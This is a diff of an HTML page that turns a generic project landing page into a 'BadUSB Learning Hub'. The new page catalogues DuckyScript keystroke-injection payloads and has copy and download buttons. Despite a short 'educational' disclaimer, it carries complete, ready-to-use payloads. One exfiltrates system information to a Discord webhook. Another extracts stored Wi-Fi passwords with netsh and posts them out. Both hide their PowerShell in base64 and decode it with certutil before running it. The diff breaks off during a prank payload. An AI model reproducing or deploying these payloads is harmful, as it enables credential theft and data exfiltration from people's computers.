@@ -1,625 +1,776 @@
-<html><head><base href="https://github.com/PDXF/K.E.X-REPO">
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ZrK Repository - Innovative Knowledge Exchange</title>
-<style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
-
-    :root {
-        --primary-color: #00ff9d;
-        --secondary-color: #0077ff;
-        --background-color: #0a0e17;
-        --text-color: #ffffff;
-        --card-bg-color: #1a1f2e;
-    }
-
-    body, html {
-        margin: 0;
-        padding: 0;
-        font-family: 'Poppins', sans-serif;
-        background-color: var(--background-color);
-        color: var(--text-color);
-        overflow-x: hidden;
-        scroll-behavior: smooth;
-    }
-
-    ::-webkit-scrollbar {
-        display: none;
-    }
-
-    html {
-        scrollbar-width: none;
-    }
-
-    .container {
-        max-width: 1200px;
-        margin: 0 auto;
-        padding: 0 20px;
-    }
-
-    header {
-        background-color: rgba(10, 14, 23, 0.8);
-        backdrop-filter: blur(10px);
-        padding: 20px 0;
-        position: fixed;
-        width: 100%;
-        top: 0;
-        z-index: 1000;
-        transition: all 0.3s ease;
-    }
-
-    header.scrolled {
-        padding: 10px 0;
-        background-color: rgba(10, 14, 23, 0.95);
-    }
-
-    nav {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-    }
-
-    .logo {
-        font-size: 1.8em;
-        font-weight: 700;
-        color: var(--primary-color);
-        text-decoration: none;
-        position: relative;
-        overflow: hidden;
-    }
-
-    .logo::after {
-        content: '';
-        position: absolute;
-        bottom: 0;
-        left: -100%;
-        width: 100%;
-        height: 2px;
-        background-color: var(--primary-color);
-        transition: all 0.3s ease;
-    }
-
-    .logo:hover::after {
-        left: 0;
-    }
-
-    .nav-links {
-        display: flex;
-        gap: 20px;
-    }
-
-    .nav-links a {
-        color: var(--text-color);
-        text-decoration: none;
-        font-weight: 500;
-        transition: color 0.3s ease, transform 0.3s ease;
-        position: relative;
-    }
-
-    .nav-links a::before {
-        content: '';
-        position: absolute;
-        width: 100%;
-        height: 2px;
-        bottom: -5px;
-        left: 0;
-        background-color: var(--primary-color);
-        visibility: hidden;
-        transform: scaleX(0);
-        transition: all 0.3s ease-in-out;
-    }
-
-    .nav-links a:hover::before {
-        visibility: visible;
-        transform: scaleX(1);
-    }
-
-    .nav-links a:hover {
-        color: var(--primary-color);
-        transform: translateY(-3px);
-    }
-
-    .github-link, .discord-link {
-        display: inline-flex;
-        align-items: center;
-        padding: 10px 20px;
-        background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
-        color: var(--background-color);
-        text-decoration: none;
-        border-radius: 25px;
-        font-weight: 600;
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
-        position: relative;
-        overflow: hidden;
-        margin-left: 10px;
-    }
-
-    .github-link::before, .discord-link::before {
-        content: '';
-        position: absolute;
-        top: -50%;
-        left: -50%;
-        width: 200%;
-        height: 200%;
-        background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0) 80%);
-        transform: scale(0);
-        transition: transform 0.6s ease-out;
-    }
-
-    .github-link:hover::before, .discord-link:hover::before {
-        transform: scale(1);
-    }
-
-    .github-link:hover, .discord-link:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 4px 15px rgba(0, 255, 157, 0.4);
-    }
-
-    .github-link svg, .discord-link svg {
-        margin-right: 8px;
-        width: 20px;
-        height: 20px;
-        fill: var(--background-color);
-    }
-
-    .hero {
-        height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        text-align: center;
-        position: relative;
-        overflow: hidden;
-    }
-
-    .hero::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        background: linear-gradient(45deg, rgba(0, 255, 157, 0.1), rgba(0, 119, 255, 0.1));
-        z-index: -1;
-    }
-
-    .hero h1 {
-        font-size: 4em;
-        margin-bottom: 20px;
-        animation: glow 2s ease-in-out infinite alternate;
-    }
-
-    .hero h1 span {
-        background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-    }
-
-    @keyframes glow {
-        from {
-            text-shadow: 0 0 5px var(--primary-color), 0 0 10px var(--primary-color);
+<html><head><base href="https://zrk-badusb-learning.com/">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZRK BadUSB Learning Hub</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            line-height: 1.6;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            transition: background-color 0.3s ease;
         }
-        to {
-            text-shadow: 0 0 10px var(--primary-color), 0 0 20px var(--primary-color), 0 0 30px var(--primary-color);
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
         }
-    }
-
-    .hero p {
-        font-size: 1.2em;
-        max-width: 600px;
-        margin: 0 auto 30px;
-    }
-
-    .cta-button {
-        display: inline-block;
-        padding: 12px 30px;
-        background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
-        color: var(--background-color);
-        text-decoration: none;
-        border-radius: 25px;
-        font-weight: 600;
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .cta-button:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 4px 15px rgba(0, 255, 157, 0.4);
-    }
-
-    .discord-link {
-        animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-        0% {
-            box-shadow: 0 0 0 0 rgba(0, 119, 255, 0.4);
+        header {
+            background-color: #2c3e50;
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        70% {
-            box-shadow: 0 0 0 10px rgba(0, 119, 255, 0);
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+            animation: fadeInDown 0.5s ease-out;
         }
-        100% {
-            box-shadow: 0 0 0 0 rgba(0, 119, 255, 0);
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
-    }
-
-    .discord-link:hover {
-        animation: none;
-    }
-
-    .discord-modal {
-        display: none;
-        position: fixed;
-        z-index: 1001;
-        left: 0;
-        top: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0,0,0,0.4);
-    }
-
-    .discord-modal-content {
-        background-color: var(--card-bg-color);
-        margin: 15% auto;
-        padding: 20px;
-        border: 1px solid var(--primary-color);
-        border-radius: 15px;
-        width: 300px;
-        text-align: center;
-    }
-
-    .discord-loader {
-        border: 8px solid var(--secondary-color);
-        border-top: 8px solid var(--primary-color);
-        border-radius: 50%;
-        width: 50px;
-        height: 50px;
-        animation: spin 1s linear infinite;
-        margin: 20px auto;
-    }
-
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-
-    /* Additional styles for other sections */
-    section {
-        padding: 80px 0;
-    }
-
-    h2 {
-        font-size: 2.5em;
-        margin-bottom: 30px;
-        text-align: center;
-    }
-
-    .features-grid, .team-grid, .showcase-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-        gap: 30px;
-        margin-top: 50px;
-    }
-
-    .feature-card, .team-card, .showcase-card {
-        background-color: var(--card-bg-color);
-        border-radius: 10px;
-        padding: 30px;
-        text-align: center;
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .feature-card:hover, .team-card:hover, .showcase-card:hover {
-        transform: translateY(-10px);
-        box-shadow: 0 10px 20px rgba(0, 255, 157, 0.2);
-    }
-
-    .timeline {
-        position: relative;
-        max-width: 800px;
-        margin: 0 auto;
-    }
-
-    .timeline::after {
-        content: '';
-        position: absolute;
-        width: 6px;
-        background-color: var(--primary-color);
-        top: 0;
-        bottom: 0;
-        left: 50%;
-        margin-left: -3px;
-    }
-
-    .timeline-item {
-        padding: 10px 40px;
-        position: relative;
-        background-color: inherit;
-        width: 50%;
-    }
-
-    .timeline-item::after {
-        content: '';
-        position: absolute;
-        width: 25px;
-        height: 25px;
-        right: -17px;
-        background-color: var(--secondary-color);
-        border: 4px solid var(--primary-color);
-        top: 15px;
-        border-radius: 50%;
-        z-index: 1;
-    }
-
-    .left {
-        left: 0;
-    }
-
-    .right {
-        left: 50%;
-    }
-
-    .left::before {
-        content: " ";
-        height: 0;
-        position: absolute;
-        top: 22px;
-        width: 0;
-        z-index: 1;
-        right: 30px;
-        border: medium solid var(--card-bg-color);
-        border-width: 10px 0 10px 10px;
-        border-color: transparent transparent transparent var(--card-bg-color);
-    }
-
-    .right::before {
-        content: " ";
-        height: 0;
-        position: absolute;
-        top: 22px;
-        width: 0;
-        z-index: 1;
-        left: 30px;
-        border: medium solid var(--card-bg-color);
-        border-width: 10px 10px 10px 0;
-        border-color: transparent var(--card-bg-color) transparent transparent;
-    }
-
-    .right::after {
-        left: -16px;
-    }
-
-    .timeline-content {
-        padding: 20px 30px;
-        background-color: var(--card-bg-color);
-        position: relative;
-        border-radius: 6px;
-    }
-
-    /* Animation for timeline items */
-    .timeline-item {
-        opacity: 0;
-        transform: translateY(50px);
-        transition: all 0.5s ease;
-    }
-
-    .timeline-item.animate {
-        opacity: 1;
-        transform: translateY(0);
-    }
-
-    footer {
-        background-color: var(--card-bg-color);
-        padding: 20px 0;
-        text-align: center;
-    }
-</style>
+        .disclaimer {
+            background-color: #e74c3c;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(231, 76, 60, 0.4);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(231, 76, 60, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(231, 76, 60, 0);
+            }
+        }
+        .search-container {
+            margin-bottom: 30px;
+        }
+        #search {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            border: none;
+            border-radius: 25px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+        }
+        #search:focus {
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            outline: none;
+        }
+        .categories {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .category {
+            background-color: #3498db;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .category:hover {
+            background-color: #2980b9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+        }
+        .attack-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        .attack-item {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            overflow: hidden;
+            transition: all 0.3s ease;
+            animation: fadeIn 0.5s ease-out;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .attack-item:hover {
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+        }
+        .attack-header {
+            background-color: #34495e;
+            color: white;
+            padding: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        .attack-header::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: rgba(255,255,255,0.1);
+            transform: rotate(45deg);
+            transition: all 0.3s ease;
+        }
+        .attack-item:hover .attack-header::after {
+            top: -10%;
+            left: -10%;
+        }
+        .attack-name {
+            font-weight: bold;
+            font-size: 1.2em;
+            margin: 0;
+        }
+        .attack-category {
+            font-size: 0.9em;
+            opacity: 0.8;
+        }
+        .attack-content {
+            padding: 15px;
+        }
+        .attack-description {
+            margin-bottom: 15px;
+        }
+        .attack-code {
+            background-color: #f7f9fb;
+            border: 1px solid #e1e8ed;
+            border-radius: 5px;
+            padding: 10px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            font-size: 0.9em;
+            max-height: 200px;
+            overflow-y: auto;
+            position: relative;
+        }
+        .copy-btn, .download-btn {
+            position: absolute;
+            top: 5px;
+            padding: 5px 10px;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 0.8em;
+            transition: all 0.3s ease;
+            opacity: 0;
+        }
+        .attack-item:hover .copy-btn,
+        .attack-item:hover .download-btn {
+            opacity: 1;
+        }
+        .copy-btn {
+            right: 80px;
+            background-color: #3498db;
+        }
+        .download-btn {
+            right: 5px;
+            background-color: #2ecc71;
+        }
+        .copy-btn:hover, .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        .copy-btn:hover {
+            background-color: #2980b9;
+        }
+        .download-btn:hover {
+            background-color: #27ae60;
+        }
+        .download-all-btn {
+            display: block;
+            margin: 20px auto;
+            padding: 12px 30px;
+            background-color: #e74c3c;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        .download-all-btn:hover {
+            background-color: #c0392b;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+        }
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 5px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+        
+        /* Updated styles for ZRK NoEscape */
+        .attack-item.zrk-noescape {
+            background-color: #300;
+            border: 2px solid #f00;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+        
+        .attack-item.zrk-noescape .attack-header {
+            background-color: #600;
+            color: #ff0;
+        }
+        
+        .attack-item.zrk-noescape::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, #f00, transparent);
+            animation: glitch 10s linear infinite;
+            opacity: 0.2;
+        }
+        
+        @keyframes glitch {
+            0% {
+                transform: translateX(-10%) translateY(-10%) rotate(0deg);
+            }
+            25% {
+                transform: translateX(10%) translateY(10%) rotate(90deg);
+            }
+            50% {
+                transform: translateX(-10%) translateY(10%) rotate(180deg);
+            }
+            75% {
+                transform: translateX(10%) translateY(-10%) rotate(270deg);
+            }
+            100% {
+                transform: translateX(-10%) translateY(-10%) rotate(360deg);
+            }
+        }
+        
+        .attack-item.zrk-noescape .attack-name {
+            text-shadow: 0 0 5px #f00;
+        }
+        
+        .attack-item.zrk-noescape .attack-name::after {
+            content: ' ⚠️';
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        .attack-item.zrk-noescape .attack-description,
+        .attack-item.zrk-noescape .attack-category {
+            color: #faa;
+        }
+        
+        .attack-item.zrk-noescape .attack-code {
+            background-color: #200;
+            border-color: #600;
+            color: #faa;
+        }
+        
+        .attack-item.zrk-noescape .copy-btn,
+        .attack-item.zrk-noescape .download-btn {
+            background-color: #900;
+        }
+        
+        .attack-item.zrk-noescape .copy-btn:hover,
+        .attack-item.zrk-noescape .download-btn:hover {
+            background-color: #c00;
+        }
+    </style>
 </head>
 <body>
     <header>
-        <nav class="container">
-            <a href="#" class="logo">ZrK</a>
-            <div class="nav-links">
-                <a href="#features">Features</a>
-                <a href="#team">Team</a>
-                <a href="#timeline">Timeline</a>
-                <a href="#showcase">Showcase</a>
-                <a href="#faq">FAQ</a>
-                <a href="#contact">Contact</a>
-            </div>
-            <a href="https://github.com/PDXF/K.E.X-REPO" class="github-link" id="github-link" target="_blank">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
-                GitHub
-            </a>
-            <a href="#" class="discord-link" id="discord-link">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"/></svg>
-                Discord
-            </a>
-        </nav>
+        <div class="container">
+            <h1>ZRK BadUSB Learning Hub</h1>
+        </div>
     </header>
 
-    <main>
-        <section class="hero">
-            <div class="container">
-                <h1>Welcome to <span>ZrK</span></h1>
-                <p>Revolutionizing knowledge exchange through innovative AI-powered solutions.</p>
-                <a href="#features" class="cta-button">Explore Features</a>
-            </div>
-        </section>
-
-        <section id="features">
-            <div class="container">
-                <h2>Features</h2>
-                <div class="features-grid">
-                    <div class="feature-card">
-                        <h3>AI-Powered Analysis</h3>
-                        <p>Advanced algorithms to process and analyze complex data sets.</p>
-                    </div>
-                    <div class="feature-card">
-                        <h3>Real-time Collaboration</h3>
-                        <p>Seamless teamwork with instant updates and shared workspaces.</p>
-                    </div>
-                    <div class="feature-card">
-                        <h3>Adaptive Learning</h3>
-                        <p>Personalized learning paths that evolve with user progress.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section id="team">
-            <div class="container">
-                <h2>Our Team</h2>
-                <div class="team-grid">
-                    <div class="team-card">
-                        <h3>open postion</h3>
-                        <p>AI Research Lead</p>
-                    </div>
-                    <div class="team-card">
-                        <h3>Quantum</h3>
-                        <p>UX Designer</p>
-                    </div>
-                    <div class="team-card">
-                        <h3>PDX</h3>
-                        <p>Head Developer</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section id="timeline">
-            <div class="container">
-                <h2>Project Timeline</h2>
-                <div class="timeline">
-                    <div class="timeline-item left">
-                        <div class="timeline-content">
-                            <h3>Project Inception</h3>
-                            <p>Q1 2023</p>
-                        </div>
-                    </div>
-                    <div class="timeline-item right">
-                        <div class="timeline-content">
-                            <h3>Alpha Release</h3>
-                            <p>Q3 2023</p>
-                        </div>
-                    </div>
-                    <div class="timeline-item left">
-                        <div class="timeline-content">
-                            <h3>Beta Testing</h3>
-                            <p>Q4 2023</p>
-                        </div>
-                    </div>
-                    <div class="timeline-item right">
-                        <div class="timeline-content">
-                            <h3>Official Launch</h3>
-                            <p>Q2 2024</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section id="showcase">
-            <div class="container">
-                <h2>Showcase</h2>
-                <div class="showcase-grid">
-                    <div class="showcase-card">
-                        <h3>Project A</h3>
-                        <p>An AI-driven data analysis tool for financial markets.</p>
-                    </div>
-                    <div class="showcase-card">
-                        <h3>Project B</h3>
-                        <p>Real-time language translation platform for global conferences.</p>
-                    </div>
-                    <div class="showcase-card">
-                        <h3>Project C</h3>
-                        <p>Adaptive learning system for STEM education.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section id="faq">
-            <div class="container">
-                <h2>Frequently Asked Questions</h2>
-                <!-- Add FAQ content here -->
-            </div>
-        </section>
-
-        <section id="contact">
-            <div class="container">
-                <h2>Contact Us</h2>
-                <!-- Add contact form or contact information here -->
-            </div>
-        </section>
-    </main>
-
-    <footer>
-        <div class="container">
-            <p>&copy; 2023 ZrK. All rights reserved.</p>
+    <div class="container">
+        <div class="disclaimer">
+            WARNING: This database is for educational purposes only. Unauthorized use of these techniques is illegal and unethical.
         </div>
-    </footer>
 
-    <div id="discord-modal" class="discord-modal">
-        <div class="discord-modal-content">
-            <h3>Joining Discord...</h3>
-            <div class="discord-loader"></div>
+        <div class="search-container">
+            <input type="text" id="search" placeholder="Search for BadUSB attacks...">
+        </div>
+
+        <div class="categories" id="categories">
+            <!-- Categories will be dynamically added here -->
+        </div>
+
+        <button id="downloadAllBtn" class="download-all-btn">Download All Scripts</button>
+
+        <div class="attack-list" id="attackList">
+            <!-- Attack items will be dynamically added here -->
         </div>
     </div>
 
     <script>
-    document.addEventListener('DOMContentLoaded', (event) => {
-        const header = document.querySelector('header');
-        const discordLink = document.getElementById('discord-link');
-        const discordModal = document.getElementById('discord-modal');
+        const attacks = [
+            {
+                name: "ZRK Computer Info to Discord",
+                category: "Reconnaissance",
+                description: "Retrieves computer information and sends it to a Discord webhook.",
+                code: `REM Title: Computer info to Discord Webhook
+REM Description: Retrieves the computer information and sends it as JSON content in a POST request to a Discord webhook.
+REM AUTHOR: K1kuK0nK4
+REM Target: Windows
 
-        window.addEventListener('scroll', () => {
-            if (window.scrollY > 100) {
-                header.classList.add('scrolled');
-            } else {
-                header.classList.remove('scrolled');
-            }
-        });
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 2000
+REM Replace "webhookgoeshere" by webhook URL.
+STRING $webhook = "webhookgoeshere";
+REM Replace the base64 string by the powershell encoded script.
+STRING $TempFile = "$env:TEMP\\temp.ps1"; $File = "$env:TEMP\\k.ps1"; echo JG91dHB1dCA9IHN5c3RlbWluZm8KJGI2NG91dHB1dCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkb3V0cHV0KSkKJG1heFNlZ21lbnRMZW5ndGggPSAxODAwCiRzZWdtZW50cyA9IFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ11dQCgpCmZvciAoJGkgPSAwOyAkaSAtbHQgJGI2NG91dHB1dC5MZW5ndGg7ICRpICs9ICRtYXhTZWdtZW50TGVuZ3RoKSB7CiAgICAkc2VnbWVudCA9ICRiNjRvdXRwdXQuU3Vic3RyaW5nKCRpLCBbTWF0aF06Ok1pbigkbWF4U2VnbWVudExlbmd0aCwgJGI2NG91dHB1dC5MZW5ndGggLSAkaSkpCiAgICAkc2VnbWVudHMuQWRkKCRzZWdtZW50KQp9CmZvcmVhY2ggKCRzZWdtZW50IGluICRzZWdtZW50cykgewogICAgJGJvZHkgPSBAewogICAgICAgIGNvbnRlbnQgPSAkc2VnbWVudAogICAgfSB8IENvbnZlcnRUby1Kc29uCkludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKfQ== > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\\k.ps1"
+DELAY 1000
+ENTER`
+            },
+            {
+                name: "ZRK Wifi Passwords to Discord",
+                category: "Network Exploitation",
+                description: "Retrieves Wi-Fi stored passwords and sends them to a Discord webhook.",
+                code: `REM Title: Wifi stored passwords to Discord Webhook
+REM Description: Retrieves the Wifi stored passwords from the computer and sends it as JSON content in a POST request to a Discord webhook.
+REM AUTHOR: K1kuK0nK4
+REM Target: Windows
 
-        // Smooth scrolling for navigation links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                document.querySelector(this.getAttribute('href')).scrollIntoView({
-                    behavior: 'smooth'
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 2000
+REM Replace "webhookgoeshere" by webhook URL.
+STRING $webhook = "webhookgoeshere";
+REM Replace the base64 string by the powershell encoded script.
+STRING $TempFile = "$env:TEMP\\temp.ps1"; $File = "$env:TEMP\\k.ps1"; echo JHdpZmkgPSBuZXRzaCB3bGFuIHNob3cgcHJvZmlsZXMKJGNyZWRzID0gQCgpCiR3aWZpIHwgJSB7CiAgICBpZiAoJF8gLW1hdGNoICJQZXJmaWwgZGUgdG9kb3MgbG9zIHVzdWFyaW9zXHMrOlxzKyguKil8QWxsIFVzZXIgUHJvZmlsZVxzKzpccysoLiopIikgewogICAgICAgICRuZXROID0gaWYgKCRtYXRjaGVzWzFdKSB7ICRtYXRjaGVzWzFdLlRyaW0oKSB9IGVsc2UgeyAkbWF0Y2hlc1syXS5UcmltKCkgfQogICAgICAgICRwcm9mSW5mbyA9IG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlIG5hbWU9IiRuZXROIiBrZXk9Y2xlYXIKICAgICAgICAka2V5Q29udCA9IGlmICgkcHJvZkluZm8gfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJDb250ZW5pZG8gZGUgbGEgY2xhdmV8S2V5IENvbnRlbnQiKSB7CiAgICAgICAgICAgICgkcHJvZkluZm8gfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJDb250ZW5pZG8gZGUgbGEgY2xhdmV8S2V5IENvbnRlbnQiKS5MaW5lIC1yZXBsYWNlICJeXHMqKENvbnRlbmlkbyBkZSBsYSBjbGF2ZXxLZXkgQ29udGVudClccyo6XHMqIiwgIiIKICAgICAgICB9IGVsc2UgeyAiTm8gc2UgcHVkbyByZWN1cGVyYXIgbGEgY2xhdmUiIH0KICAgICAgICAkY3JlZHMgKz0gIiRuZXROOjoka2V5Q29udCIKICAgIH0KfQokYjY0Y3JlZHMgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGNyZWRzIC1qb2luICJgbiIpKQokY2h1bmtzID0gW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXV06Om5ldygpCndoaWxlICgkYjY0Y3JlZHMuTGVuZ3RoIC1ndCAwKSB7CiAgICAkY2h1bmsgPSBpZiAoJGI2NGNyZWRzLkxlbmd0aCAtZ3QgMTgwMCkgeyAkYjY0Y3JlZHMuU3Vic3RyaW5nKDAsIDE4MDApIH0gZWxzZSB7ICRiNjRjcmVkcyB9CiAgICAkY2h1bmtzLkFkZCgkY2h1bmspCiAgICAkYjY0Y3JlZHMgPSAkYjY0Y3JlZHMuU3Vic3RyaW5nKCRjaHVuay5MZW5ndGgpCn0KJGNodW5rcyB8ICUgewogICAgJGJvZHkgPSBAeyBjb250ZW50ID0gJF8gfSB8IENvbnZlcnRUby1Kc29uCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rIC1NZXRob2QgUG9zdCAtQm9keSAkYm9keSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iCn0= > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\\k.ps1"
+DELAY 1000
+ENTER`
+            },
+            {
+                name: "ZRK JumpScare 2.0",
+                category: "Prank",
+                description: "Executes a jumpscare when mouse movement is detected.",
+                code: `DELAY 2000
+GUI r
+DELAY 500
